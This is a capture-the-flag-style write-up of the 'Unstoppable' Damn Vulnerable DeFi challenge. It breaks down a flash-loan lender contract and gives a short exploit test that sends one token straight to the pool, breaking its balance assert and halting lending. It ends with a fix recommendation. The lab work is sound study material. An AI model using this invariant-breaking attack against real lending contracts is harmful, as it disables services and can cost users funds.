# Unstoppable

## Introduction

The goal is stop pool from offering flash loan.
How does flash loan works?
In simple terms, flash loan are broken down into 3 steps and to be completed in a single transaction.
1) A loan from a pool of money is sent to receiver.
2) Receiver will use the money to execute a certain action from another smart contract.
3) Receiver will return the money with fixed rate (Something like an interest rate).

Reference: <https://10clouds.com/blog/defi/understanding-flash-loans-in-defi/>

## Code Breakdown

Let's start by breaking down the source code into functions.
There are two files - ***UnstoppableLender.sol*** and ***ReceiverUnstoppable.sol***.
***UnstoppableLender.sol*** will loan money to receiver and execute functions from ***ReceiverUnstoppable.sol***.

However, we'll look at ***UnstoppableLender.sol*** primarily.

There are a few variables declared, one consutructors and two functions in the smart contract.

For starters, this contract mainly use damnValuableToken as their main currency - ```IERC20 public immutable damnValuableToken```.
Openzeppelin is used to create the token.

Reference: <https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20>

```uint256 public poolBalance``` is created to store a pool token ready to be loaned. 

Next, a constructor is called whenever the smart contract is deployed.
Next, the tokens will be named as ***damnValuableToken***.
```
constructor(address tokenAddress) {
    require(tokenAddress != address(0), "Token address cannot be zero");
    damnValuableToken = IERC20(tokenAddress);
}
```
It requires ***tokenAddress*** and it performs a check if the address is 0. This will ensure the address integrity.

Now, we can talk about the functions in question.
Let's start with ***depositTokens***.
```
function depositTokens(uint256 amount) external nonReentrant {
    require(amount > 0, "Must deposit at least one token");
    // Transfer token from sender. Sender must have first approved them.
    damnValuableToken.transferFrom(msg.sender, address(this), amount);
    poolBalance = poolBalance + amount;
}
```

The functions require ***amount*** to be specified and more than 0 when it's called.
As part of an innate function from openzeppelin IERC20 , ```damnValuableToken.transferFrom(msg.sender, address(this), amount);``` will then transfer ```amount``` to ```address(this)``` from ```msg.sender```.
```msg.sender``` = sender address (deployer).
```address(this)``` = receiver address (pool smart contract address).
```amount``` = amount of tokens deposited to pool.

***poolBalance*** will be updated along with the new amount.
Note that this is the only place where ***poolBalance*** can be updated.


Next, ***flashLoan*** is the main function to execute a flash loan.
```
function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // Ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore);
    
    damnValuableToken.transfer(msg.sender, borrowAmount);
    
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
    
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

I'll breakdown a few requirements quickly.
```require(borrowAmount > 0, "Must borrow at least one token");``` = Amount borrowed must be more than 1 token.
```require(balanceBefore >= borrowAmount, "Not enough tokens in pool");``` = Current amount of tokens in the pool must be more than amount borrowed.
```assert(poolBalance == balanceBefore);``` = Current amount of tokens in poolBalance must be the same before the flashloan.
```damnValuableToken.transfer(msg.sender, borrowAmount);``` = Token transferred to receiver.
```IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);``` = Execute function in another contract ***ReceiverUnstoppable.sol***. 

During this function, tokens loaned to receiver will be returned to pool.
```require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");``` = Amount of tokens after loaned must be more than the amount of tokens before the loan

## Hints
The goal is to stop the smart contract from functioning. 
Take a look at this section ```assert(poolBalance == balanceBefore);```.

Technically, there exist 2 pool balance - 1 in ***UnstoppableLender.sol** and ***DamnValuableToken.sol***.

Notice that ***poolBalance*** must be equal to ***balanceBefore***. These are the 2 pool balance
***poolBalance*** can only be increased from the function ***depositTokens***.
***balanceBefore*** checks for the current tokens in the pool directly from ***DamnValuableToken.sol*** (openzeppelin innate function). 
Therefore, both variables are async.
A simple solution is to transfer token directly into ***DamnValuableToken.sol*** to trigger a revert in ```assert(poolBalance == balanceBefore);```.

## Solution
Here's the solution (I've added 2 functions in ***ReceiverUnstoppable.sol*** to retrieve the number of tokens in the pool).
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    //Before Transfer
    before_bal1 = await this.pool.getPoolBal();
    before_bal2 = await this.pool.getTokenBal();
    console.log("Before transfer:\nBalance from ReceiverUnstoppable.sol - ", before_bal1.toString());
    console.log("Balance from DamnValuableToken.sol - ", before_bal2.toString());

    //Transfer token to halt flashloan services
    console.log("Transferring 1 token to DamnValuableToken.sol pool");
    await this.token.transfer(this.pool.address, 1);

    //After Transfer
    after_bal1 = await this.pool.getPoolBal();
    after_bal2 = await this.pool.getTokenBal();
    console.log("After transfer:\nBalance from ReceiverUnstoppable.sol - ", after_bal1.toString());
    console.log("Balance from DamnValuableToken.sol - ", after_bal2.toString());
});
```

Functions added to reflect the result below
```
function getPoolBal() public view returns (uint256){
    return poolBalance;
}

function getTokenBal() public view returns (uint256){
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    return balanceBefore;
}
```

Here's the result 
```
Before transfer:
Balance from ReceiverUnstoppable.sol -  1000000000000000000000000
Balance from DamnValuableToken.sol -  1000000000000000000000000
Transferring 1 token to DamnValuableToken.sol pool
After transfer:
Balance from ReceiverUnstoppable.sol -  1000000000000000000000000
Balance from DamnValuableToken.sol -  1000000000000000000000001
```


## Recommendations
By no means you should ever need two set of pools. For the sake of this challenge, one simple solution is to sync ***poolBalance*** and ***damnValuableToken.balanceOf(address(this))*** whenever a new token is transferred into either pool. Although it will create a whole new magntitude of problem but hey, at least its solved. :)
